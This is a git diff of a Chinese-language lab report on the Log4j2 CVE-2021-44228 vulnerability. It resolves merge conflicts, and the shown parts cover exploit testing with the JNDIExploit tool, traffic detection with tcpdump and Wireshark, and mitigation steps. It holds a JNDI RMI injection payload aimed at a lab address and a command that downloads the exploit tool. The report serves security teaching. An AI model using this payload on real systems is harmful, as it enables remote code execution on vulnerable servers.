@@ -18,11 +18,7 @@ Ani
     - [验证漏洞可利用性](#验证漏洞可利用性)
     - [漏洞利用效果](#漏洞利用效果)
         - [使用 JNDIExploit 工具](#使用-jndiexploit-工具)
-<<<<<<< HEAD
-    - [漏洞利用防御与加固](#漏洞利用防御与加固) 
-=======
     - [漏洞利用缓解与修复](#漏洞利用缓解与修复) 
->>>>>>> ceea5a9 (update)
         - [漏洞利用防御与加固](#漏洞利用防御与加固)
 - [参考资料](#参考资料)
 
@@ -30,17 +26,12 @@ Ani
 
 ### 负责工作
 
-<<<<<<< HEAD
-- 作为红队完成对漏洞的存在性检验以及实现漏洞利用
-- 作为蓝队完成漏洞利用的缓解
-=======
 - Log4j2 CVE-2021-44228
   - 漏洞存在性检验
   - 漏洞可利用性
   - 漏洞利用效果
   - 漏洞利用检验
   - 漏洞利用缓解与修复
->>>>>>> ceea5a9 (update)
 
 ### 实验目的
 
@@ -74,11 +65,8 @@ Ani
 
 `Burpsuite`
 
-<<<<<<< HEAD
-=======
 `Wireshark`
 
->>>>>>> ceea5a9 (update)
 ### 实验过程
 
 #### 从零开始搭建基础虚拟机环境
@@ -524,11 +512,7 @@ wget https://hub.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExpl
 新安装了 `Extension` 拓展包并打开系统隐私权限也无法拖拽，于是曲线救国使用 `ssh` 将文件远程传入虚拟机
 
 ```bash
-<<<<<<< HEAD
-scp 
-=======
 scp JNDIExploit.v1.2.zip kali@192.168.58.3:./
->>>>>>> ceea5a9 (update)
 ```
 
 ![scp](img/scpzip.png)
@@ -594,9 +578,6 @@ ${jndi:rmi://192.168.56.3:1099/prj2oz}
 
 ![tongguo](img/tongguo.png)
 
-<<<<<<< HEAD
-#### 漏洞利用缓解
-=======
 #### 漏洞利用检测
 
 使用 `Docker` 的网络命名空间和网络抓包工具来捕获和分析流量
@@ -724,7 +705,6 @@ tcpdump -i eth0 -w captured.pcap
 
 - 第三方应用服务修复
   - 此次漏洞受影响的范围还是非常广泛的，包括一些常用的中间件、数据库。这些第三方的应用服务，短时间内在官方没有发布安全版本的情况下，只能临时通过替换应用目录中的 `jar` 文件的方式进行修复；可以去官方的 `snapshot` 库下载最新的 `jar` 文件，对第三方服务进行替换操作；(注意做好文件备份工作，有的服务可能会出现启动失败的情况)
->>>>>>> ceea5a9 (update)
 
 ##### 漏洞利用防御与加固
 
@@ -734,10 +714,7 @@ tcpdump -i eth0 -w captured.pcap
 
 
 
-<<<<<<< HEAD
-=======
 
->>>>>>> ceea5a9 (update)
 ### 参考资料
 
 [网络安全 2021 综合实验](https://www.bilibili.com/video/BV1p3411x7da?p=4&spm_id_from=pageDriver&vd_source=c77148c25420ef65a1b98a765a8e118c)
@@ -754,13 +731,10 @@ tcpdump -i eth0 -w captured.pcap
 
 [bash_dev_tcp 介绍](https://becivells.github.io/2019/01/bash_i_dev_tcp/)
 
-<<<<<<< HEAD
-=======
 [log4j2 漏洞缓解](https://zhuanlan.zhihu.com/p/444329520#:~:text=Apache%20log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20%28JNDI%E6%B3%A8%E5%85%A5%29%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%92%8C%E5%BD%B1%E5%93%8D%E7%BC%93%E8%A7%A3%201%200x01%20%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%202%20log4j2%E7%89%88%E6%9C%AC%3E%3D2.10%E7%9A%84%E6%83%85%E5%86%B5%E4%BD%BF%E7%94%A8%E5%A6%82%E4%B8%8B%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%EF%BC%9A,4%20Log4j2%202.15.0%20jar%E5%8C%85%E4%B8%8B%E8%BD%BD%EF%BC%9A%20%E6%9C%80%E5%90%8E%20%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0%20%E6%9C%80%E5%90%8E%20)
 
 [Log4j2漏洞修复](https://blog.csdn.net/derstsea/article/details/121918902)
 
 [Wireshark 网络数据包角度看log4j](https://blog.csdn.net/weixin_47627078/article/details/122251204)
->>>>>>> ceea5a9 (update)
 ---
 
